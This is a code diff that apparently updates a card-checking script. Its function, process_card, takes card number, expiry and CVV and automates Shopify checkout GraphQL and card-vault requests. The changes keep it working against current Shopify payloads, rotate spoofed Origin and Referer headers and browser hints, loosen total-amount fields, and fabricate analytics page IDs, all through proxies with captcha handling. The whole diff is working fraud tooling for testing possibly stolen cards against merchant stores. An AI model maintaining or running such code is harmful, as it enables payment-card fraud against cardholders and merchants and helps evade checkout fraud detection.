@@ -1502,9 +1502,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             'destinationChanged': True
                         }],
                         'noDeliveryRequired': [],
-                        'useProgressiveRates': True,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True
+                        'useProgressiveRates': False,
+                        'prefetchShippingRatesStrategy': None
                     },
                     'deliveryExpectations': {'deliveryExpectationLines': []},
                     'merchandise': {
@@ -1536,13 +1535,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         }
                     },
                     'buyerIdentity': {
-                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
-                        'email': email,
-                        'emailChanged': False,
-                        'phoneCountryCode': country_code,
+                        'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': country_code},
+                        'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                         'marketingConsent': [{'email': {'value': email}}],
                         'shopPayOptInPhone': {'countryCode': country_code},
-                        'rememberMe': False
                     },
                     'tip': {'tipLines': []},
                     'taxes': {
@@ -1939,7 +1935,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 }
             }
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
-            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
+            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['countryCode'] = country_code
 
             # FIX: Pass proxy=proxy for delivery proposal GraphQL request
             response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
@@ -2067,10 +2063,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Content-Type': 'application/json',
                 'Accept': 'application/json',
                 'Accept-Language': 'en-US,en;q=0.9',
-                'Origin': 'https://checkout.pci.shopifyinc.com',
+                'Origin': 'https://checkout.shopifycs.com',
                 # FIX: Build hash `/a8e4a94/` was outdated — Shopify rotates these.
                 # Use the dynamic hash fetched from checkout page, or fallback to latest known hash.
-                'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier={attempt_token}&locationURL={quote(checkout_url, safe="")}',
+                'Referer': 'https://checkout.shopifycs.com/',
                 'User-Agent': hints['ua'],
                 'sec-ch-ua': hints['sec_ch_ua'],
                 'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
@@ -2150,11 +2146,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 }
                             },
                             'selectedDeliveryStrategy': {
-                                'deliveryStrategyByHandle': {
-                                    'handle': delivery_strategy if delivery_strategy else '',
-                                    'customDeliveryRate': False
+                                'deliveryStrategyMatchingConditions': {
+                                    'estimatedTimeInTransit': {'any': True},
+                                    'shipments': {'any': True}
                                 },
-                                'options': {'phone': phone}
+                                'options': {}
                             },
                             'targetMerchandiseLines': {
                                 'lines': [{'stableId': stableId or '1'}]
@@ -2166,9 +2162,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             'destinationChanged': False
                         }],
                         'noDeliveryRequired': [],
-                        'useProgressiveRates': True,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True
+                        'useProgressiveRates': False,
+                        'prefetchShippingRatesStrategy': None
                     },
                     'merchandise': {
                         'merchandiseLines': [{
@@ -2183,15 +2178,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 }
                             },
                             'quantity': {'items': {'value': 1}},
-                            'expectedTotalPrice': {
-                                'value': {'amount': subtotal, 'currencyCode': currency}
-                            },
+                            'expectedTotalPrice': {'any': True},
                             'lineComponentsSource': None,
                             'lineComponents': []
                         }]
                     },
                     'payment': {
-                        'totalAmount': {'value': {'amount': str(running_total), 'currencyCode': currency}},
+                        'totalAmount': {'any': True},
                         'paymentLines': [{
                             'paymentMethod': {
                                 'directPaymentMethod': {
@@ -2206,12 +2199,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                             'phone': phone
                                         }
                                     },
-                                    'cardSource': 'UNKNOWN'
+                                    'cardSource': None
                                 }
                             },
-                            'amount': {
-                                'value': {'amount': running_total, 'currencyCode': currency}
-                            },
+                            'amount': {'any': True},
                             'dueAt': None
                         }],
                         'billingAddress': {
@@ -2225,19 +2216,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         }
                     },
                     'buyerIdentity': {
-                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
-                        'email': email,
-                        'emailChanged': False,
-                        'phoneCountryCode': country_code,
+                        'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': country_code},
+                        'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                         'marketingConsent': [{'email': {'value': email}}],
-                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
-                        'rememberMe': False
+                        'shopPayOptInPhone': {'countryCode': country_code},
                     },
                     'taxes': {
                         'proposedAllocations': None,
-                        'proposedTotalAmount': {
-                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
-                        },
+                        'proposedTotalAmount': {'any': True},
                         'proposedTotalIncludedAmount': None,
                         'proposedMixedStateTotalAmount': None,
                         'proposedExemptions': []
@@ -2246,11 +2232,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'note': {'message': None, 'customAttributes': []},
                     'localizationExtension': {'fields': []},
                     'nonNegotiableTerms': None,
+                    'scriptFingerprint': {
+                        'signature': None,
+                        'signatureUuid': None,
+                        'lineItemScriptChanges': [],
+                        'paymentScriptChanges': [],
+                        'shippingScriptChanges': []
+                    },
                     'optionalDuties': {'buyerRefusesDuties': False}
                 },
                 'attemptToken': attempt_token,
                 'metafields': [],
-                'analytics': {'requestUrl': checkout_url}
+                'analytics': {
+                    'requestUrl': f'{ourl}/checkouts/cn/{attempt_token}',
+                    'pageId': f'{random.randint(10000000,99999999):08x}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(100000000000,999999999999):012x}'
+                }
             }
             
             if checkpoint_data:
